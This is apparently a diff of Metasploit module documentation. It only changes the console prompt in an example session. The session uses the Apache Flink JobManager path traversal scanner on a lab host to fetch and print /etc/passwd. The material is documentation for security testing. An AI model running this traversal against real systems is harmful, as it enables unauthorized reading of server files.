@@ -42,21 +42,21 @@ Depth for path traversal (Default: `10`)
 ### Apache Flink version 1.11.2 on Ubuntu 18.04.4
 
 ```
-msf6 > use auxiliary/scanner/http/apache_flink_jobmanager_traversal 
-msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > set rhosts 172.16.191.195
+msf > use auxiliary/scanner/http/apache_flink_jobmanager_traversal 
+msf auxiliary(scanner/http/apache_flink_jobmanager_traversal) > set rhosts 172.16.191.195
 rhosts => 172.16.191.195
-msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > check
+msf auxiliary(scanner/http/apache_flink_jobmanager_traversal) > check
 [*] 172.16.191.195:8081 - The target appears to be vulnerable. Apache Flink version 1.11.2 appears vulnerable.
-msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > set filepath /etc/passwd
+msf auxiliary(scanner/http/apache_flink_jobmanager_traversal) > set filepath /etc/passwd
 filepath => /etc/passwd
-msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > run
+msf auxiliary(scanner/http/apache_flink_jobmanager_traversal) > run
 
 [*] Downloading /etc/passwd ...
 [+] Downloaded /etc/passwd (2401 bytes)
 [+] File /etc/passwd saved in: /root/.msf4/loot/20210216114934_default_172.16.191.195_apache.flink.job_754087.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > cat /root/.msf4/loot/20210216114934_default_172.16.191.195_apache.flink.job_754087.txt
+msf auxiliary(scanner/http/apache_flink_jobmanager_traversal) > cat /root/.msf4/loot/20210216114934_default_172.16.191.195_apache.flink.job_754087.txt
 [*] exec: cat /root/.msf4/loot/20210216114934_default_172.16.191.195_apache.flink.job_754087.txt
 
 root:x:0:0:root:/root:/bin/bash
@@ -100,6 +100,6 @@ geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
 gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
 gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
 user:x:1000:1000:user,,,:/home/user:/bin/bash
-msf6 auxiliary(scanner/http/apache_flink_jobmanager_traversal) > 
+msf auxiliary(scanner/http/apache_flink_jobmanager_traversal) > 
 ```
 
